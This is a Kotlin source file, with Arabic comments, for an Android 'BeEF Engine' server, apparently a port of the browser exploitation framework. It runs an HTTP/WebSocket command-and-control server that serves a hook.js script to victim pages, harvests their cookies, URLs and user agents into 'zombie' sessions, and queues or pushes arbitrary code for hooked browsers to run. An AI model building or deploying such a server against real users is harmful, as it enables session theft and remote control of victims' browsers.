/**
 * BeEF Server - المحرك المدمج الأساسي
 * =====================================
 * 
 * خادم HTTP/WebSocket مدمج يعمل محلياً على الجهاز
 * لا يحتاج لأي اعتماديات خارجية
 */

package com.beef.engine.core

import android.content.Context
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.ServerSocket
import java.net.Socket
import java.security.MessageDigest
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import kotlin.experimental.xor

/**
 * الخادم الرئيسي - يدير HTTP و WebSocket
 */
class BeefServer(
    private val context: Context,
    private val port: Int = 3000
) {
    companion object {
        private const val TAG = "BeefServer"
        const val DEFAULT_PORT = 3000
    }

    // حالة الخادم
    private val isRunning = AtomicBoolean(false)
    private var serverSocket: ServerSocket? = null
    private var serverThread: Thread? = null
    private val executor: ExecutorService = Executors.newCachedThreadPool()
    
    // إدارة الجلسات
    val sessionManager = SessionManager()
    
    // إدارة الأوامر
    val commandDispatcher = CommandDispatcher()
    
    // مولد الـ Hook
    val hookGenerator = HookGenerator(port)
    
    // الإحصائيات
    private val requestCount = AtomicInteger(0)
    private val startTime = AtomicLong(0)
    
    // المستمعين للأحداث
    private val listeners = mutableListOf<BeefServerListener>()

    /**
     * بدء الخادم
     */
    fun start(): Boolean {
        if (isRunning.get()) {
            Log.w(TAG, "Server already running")
            return true
        }

        return try {
            serverSocket = ServerSocket(port)
            isRunning.set(true)
            startTime.set(System.currentTimeMillis())
            
            serverThread = Thread {
                Log.i(TAG, "Server started on port $port")
                notifyListeners { it.onServerStarted(port) }
                
                while (isRunning.get()) {
                    try {
                        val clientSocket = serverSocket?.accept() ?: break
                        executor.execute { handleClient(clientSocket) }
                    } catch (e: Exception) {
                        if (isRunning.get()) {
                            Log.e(TAG, "Error accepting connection", e)
                        }
                    }
                }
            }
            serverThread?.start()
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start server", e)
            notifyListeners { it.onServerError(e) }
            false
        }
    }

    /**
     * إيقاف الخادم
     */
    fun stop() {
        isRunning.set(false)
        try {
            serverSocket?.close()
            serverThread?.interrupt()
            executor.shutdown()
            notifyListeners { it.onServerStopped() }
            Log.i(TAG, "Server stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping server", e)
        }
    }

    /**
     * معالجة اتصال العميل
     */
    private fun handleClient(socket: Socket) {
        try {
            val input = BufferedReader(InputStreamReader(socket.getInputStream()))
            val output = BufferedOutputStream(socket.getOutputStream())
            
            // قراءة الطلب
            val requestLine = input.readLine() ?: return
            val headers = mutableMapOf<String, String>()
            
            var line: String?
            while (input.readLine().also { line = it } != null && line!!.isNotEmpty()) {
                val colonIndex = line!!.indexOf(':')
                if (colonIndex > 0) {
                    headers[line!!.substring(0, colonIndex).trim().lowercase()] = 
                        line!!.substring(colonIndex + 1).trim()
                }
            }
            
            requestCount.incrementAndGet()
            
            // التحقق من WebSocket Upgrade
            if (headers["upgrade"]?.lowercase() == "websocket") {
                handleWebSocket(socket, input, output, headers)
                return
            }
            
            // معالجة HTTP
            val parts = requestLine.split(" ")
            if (parts.size >= 2) {
                val method = parts[0]
                val path = parts[1].split("?")[0]
                val query = if (parts[1].contains("?")) parts[1].substringAfter("?") else ""
                
                // قراءة الجسم للـ POST
                var body = ""
                if (method == "POST" && headers.containsKey("content-length")) {
                    val contentLength = headers["content-length"]?.toIntOrNull() ?: 0
                    val bodyChars = CharArray(contentLength)
                    input.read(bodyChars, 0, contentLength)
                    body = String(bodyChars)
                }
                
                val response = routeRequest(method, path, query, headers, body)
                sendResponse(output, response)
            }
            
            socket.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error handling client", e)
        }
    }

    /**
     * توجيه الطلبات
     */
    private fun routeRequest(
        method: String,
        path: String,
        query: String,
        headers: Map<String, String>,
        body: String
    ): HttpResponse {
        Log.d(TAG, "$method $path")
        
        return when {
            // الـ Hook الرئيسي
            path == "/hook.js" -> {
                val sid = parseQuery(query)["sid"] ?: generateSessionId()
                HttpResponse(
                    statusCode = 200,
                    contentType = "application/javascript",
                    body = hookGenerator.generate(sid)
                )
            }
            
            // استقبال البيانات من الـ Hook
            path == "/hook" || path == "/api/hook" -> {
                handleHookRequest(method, query, headers, body)
            }
            
            // API للجلسات
            path == "/api/sessions" -> {
                HttpResponse(
                    statusCode = 200,
                    contentType = "application/json",
                    body = sessionManager.toJson()
                )
            }
            
            // API للأوامر
            path.startsWith("/api/command") -> {
                handleCommandRequest(method, path, body)
            }
            
            // API للحالة
            path == "/api/status" -> {
                HttpResponse(
                    statusCode = 200,
                    contentType = "application/json",
                    body = getStatusJson()
                )
            }
            
            // لوحة التحكم
            path == "/" || path == "/panel" -> {
                HttpResponse(
                    statusCode = 200,
                    contentType = "text/html",
                    body = getPanelHtml()
                )
            }
            
            // غير موجود
            else -> {
                HttpResponse(
                    statusCode = 404,
                    contentType = "text/plain",
                    body = "Not Found"
                )
            }
        }
    }

    /**
     * معالجة طلبات الـ Hook
     */
    private fun handleHookRequest(
        method: String,
        query: String,
        headers: Map<String, String>,
        body: String
    ): HttpResponse {
        val params = parseQuery(query)
        val sid = params["sid"] ?: headers["x-beef-sid"] ?: return HttpResponse(400, "text/plain", "Missing SID")
        
        try {
            val data = if (body.isNotEmpty()) JSONObject(body) else JSONObject()
            
            // تحديث أو إنشاء جلسة
            val session = sessionManager.getOrCreate(sid)
            session.lastSeen = System.currentTimeMillis()
            session.ip = headers["x-forwarded-for"] ?: "unknown"
            
            if (data.has("url")) session.pageUrl = data.getString("url")
            if (data.has("ua")) session.userAgent = data.getString("ua")
            if (data.has("cookies")) session.cookies = data.getString("cookies")
            if (data.has("screen")) session.screen = data.getString("screen")
            
            // إشعار المستمعين
            notifyListeners { it.onZombieUpdate(session) }
            
            // التحقق من وجود أوامر معلقة
            val pendingCommands = commandDispatcher.getPendingCommands(sid)
            
            return HttpResponse(
                statusCode = 200,
                contentType = "application/json",
                body = JSONObject().apply {
                    put("status", "ok")
                    put("commands", JSONArray(pendingCommands))
                }.toString()
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error handling hook request", e)
            return HttpResponse(500, "text/plain", "Error")
        }
    }

    /**
     * معالجة طلبات الأوامر
     */
    private fun handleCommandRequest(method: String, path: String, body: String): HttpResponse {
        return try {
            when (method) {
                "POST" -> {
                    val json = JSONObject(body)
                    val sid = json.getString("sid")
                    val command = json.getString("command")
                    
                    commandDispatcher.queueCommand(sid, command)
                    
                    HttpResponse(200, "application/json", """{"status":"queued"}""")
                }
                "GET" -> {
                    HttpResponse(200, "application/json", commandDispatcher.toJson())
                }
                else -> HttpResponse(405, "text/plain", "Method Not Allowed")
            }
        } catch (e: Exception) {
            HttpResponse(400, "application/json", """{"error":"${e.message}"}""")
        }
    }

    /**
     * معالجة WebSocket
     */
    private fun handleWebSocket(
        socket: Socket,
        input: BufferedReader,
        output: BufferedOutputStream,
        headers: Map<String, String>
    ) {
        val key = headers["sec-websocket-key"] ?: return
        val accept = generateWebSocketAccept(key)
        
        // إرسال استجابة الترقية
        val response = """
            HTTP/1.1 101 Switching Protocols
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Accept: $accept
            
        """.trimIndent().replace("\n", "\r\n") + "\r\n"
        
        output.write(response.toByteArray())
        output.flush()
        
        // استخراج SID من الرابط
        val query = headers["sec-websocket-protocol"] ?: ""
        val sid = parseQuery(query)["sid"] ?: generateSessionId()
        
        // إدارة اتصال WebSocket
        val wsConnection = WebSocketConnection(socket, input, output, sid)
        sessionManager.addWebSocket(sid, wsConnection)
        
        try {
            while (isRunning.get() && !socket.isClosed) {
                val frame = wsConnection.readFrame()
                if (frame != null) {
                    handleWebSocketMessage(sid, frame, wsConnection)
                }
            }
        } catch (e: Exception) {
            Log.d(TAG, "WebSocket closed: ${e.message}")
        } finally {
            sessionManager.removeWebSocket(sid)
            socket.close()
        }
    }

    /**
     * معالجة رسائل WebSocket
     */
    private fun handleWebSocketMessage(sid: String, message: String, connection: WebSocketConnection) {
        try {
            val json = JSONObject(message)
            val type = json.optString("type", "data")
            
            when (type) {
                "heartbeat" -> {
                    sessionManager.get(sid)?.lastSeen = System.currentTimeMillis()
                    connection.send("""{"type":"heartbeat","status":"ok"}""")
                }
                "result" -> {
                    val commandId = json.optString("commandId")
                    val result = json.optString("result")
                    commandDispatcher.setResult(commandId, result)
                    notifyListeners { it.onCommandResult(sid, commandId, result) }
                }
                "data" -> {
                    val session = sessionManager.get(sid)
                    if (session != null) {
                        if (json.has("cookies")) session.cookies = json.getString("cookies")
                        if (json.has("url")) session.pageUrl = json.getString("url")
                        notifyListeners { it.onZombieUpdate(session) }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling WebSocket message", e)
        }
    }

    /**
     * إرسال استجابة HTTP
     */
    private fun sendResponse(output: BufferedOutputStream, response: HttpResponse) {
        val headers = """
            HTTP/1.1 ${response.statusCode} ${getStatusText(response.statusCode)}
            Content-Type: ${response.contentType}
            Content-Length: ${response.body.toByteArray().size}
            Access-Control-Allow-Origin: *
            Access-Control-Allow-Headers: *
            Connection: close
            
        """.trimIndent().replace("\n", "\r\n") + "\r\n"
        
        output.write(headers.toByteArray())
        output.write(response.body.toByteArray())
        output.flush()
    }

    /**
     * توليد مفتاح قبول WebSocket
     */
    private fun generateWebSocketAccept(key: String): String {
        val magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
        val sha1 = MessageDigest.getInstance("SHA-1")
        val hash = sha1.digest((key + magic).toByteArray())
        return Base64.getEncoder().encodeToString(hash)
    }

    /**
     * الحصول على حالة الخادم
     */
    private fun getStatusJson(): String {
        return JSONObject().apply {
            put("running", isRunning.get())
            put("port", port)
            put("uptime", System.currentTimeMillis() - startTime.get())
            put("requests", requestCount.get())
            put("sessions", sessionManager.count())
            put("online", sessionManager.onlineCount())
        }.toString()
    }

    /**
     * صفحة لوحة التحكم البسيطة
     */
    private fun getPanelHtml(): String {
        return """
            <!DOCTYPE html>
            <html>
            <head>
                <title>BeEF Engine</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: monospace; background: #0a0e17; color: #e2e8f0; padding: 20px; }
                    h1 { color: #ef4444; }
                    .stat { background: #111827; padding: 15px; margin: 10px 0; border-radius: 8px; }
                    .online { color: #10b981; }
                </style>
            </head>
            <body>
                <h1>🛡️ BeEF Engine Pro</h1>
                <div class="stat">Status: <span class="online">● Running</span></div>
                <div class="stat">Port: $port</div>
                <div class="stat">Sessions: ${sessionManager.count()}</div>
                <div class="stat">Hook URL: <code>http://[IP]:$port/hook.js</code></div>
            </body>
            </html>
        """.trimIndent()
    }

    // ==================== Helper Functions ====================

    private fun parseQuery(query: String): Map<String, String> {
        return query.split("&")
            .mapNotNull { 
                val parts = it.split("=", limit = 2)
                if (parts.size == 2) parts[0] to parts[1] else null
            }
            .toMap()
    }

    private fun generateSessionId(): String {
        return UUID.randomUUID().toString().replace("-", "").take(16)
    }

    private fun getStatusText(code: Int): String {
        return when (code) {
            200 -> "OK"
            201 -> "Created"
            400 -> "Bad Request"
            404 -> "Not Found"
            405 -> "Method Not Allowed"
            500 -> "Internal Server Error"
            else -> "Unknown"
        }
    }

    // ==================== Listeners ====================

    fun addListener(listener: BeefServerListener) {
        listeners.add(listener)
    }

    fun removeListener(listener: BeefServerListener) {
        listeners.remove(listener)
    }

    private fun notifyListeners(action: (BeefServerListener) -> Unit) {
        listeners.forEach { 
            try { action(it) } 
            catch (e: Exception) { Log.e(TAG, "Listener error", e) }
        }
    }

    // ==================== Public API ====================

    fun isRunning() = isRunning.get()
    fun getPort() = port
    fun getUptime() = if (startTime.get() > 0) System.currentTimeMillis() - startTime.get() else 0
    fun getRequestCount() = requestCount.get()

    /**
     * إرسال أمر لجلسة معينة
     */
    fun sendCommand(sid: String, command: String): Boolean {
        val ws = sessionManager.getWebSocket(sid)
        return if (ws != null) {
            ws.send(JSONObject().apply {
                put("type", "command")
                put("code", command)
            }.toString())
            true
        } else {
            commandDispatcher.queueCommand(sid, command)
            true
        }
    }
}

// ==================== Data Classes ====================

data class HttpResponse(
    val statusCode: Int,
    val contentType: String,
    val body: String
)

class AtomicLong(initialValue: Long = 0) {
    @Volatile
    private var value = initialValue
    
    fun get() = value
    fun set(newValue: Long) { value = newValue }
}

// ==================== Listener Interface ====================

interface BeefServerListener {
    fun onServerStarted(port: Int)
    fun onServerStopped()
    fun onServerError(error: Exception)
    fun onZombieUpdate(session: ZombieSession)
    fun onCommandResult(sid: String, commandId: String, result: String)
}
